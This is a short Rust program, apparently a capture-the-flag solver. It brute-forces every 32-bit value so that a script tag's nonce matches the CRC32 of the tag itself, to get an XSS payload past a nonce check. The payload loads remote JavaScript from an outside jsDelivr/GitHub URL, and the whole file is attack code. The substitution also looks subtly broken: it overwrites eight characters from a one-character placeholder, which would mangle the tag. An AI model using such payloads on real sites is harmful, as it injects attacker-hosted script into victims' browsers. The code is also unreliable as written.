use rayon::prelude::*;

fn main() {
    let payload = "<script nonce='Z' src=https://cdn.jsdelivr.net/gh/mr-xhunt/alert-xss@main/abd.js></script>".to_string();
    let start = payload.find("Z").unwrap();
    (0..=0xFFFFFFFFu32).into_par_iter().for_each(|i| {
        let mut p = payload.clone();
        p.replace_range(start..start+8, &format!("{:08x}", i));
        if crc32fast::hash(p.as_bytes()) == i {
            println!("{} {i} {:08x}", p, i);
        }
    });
}
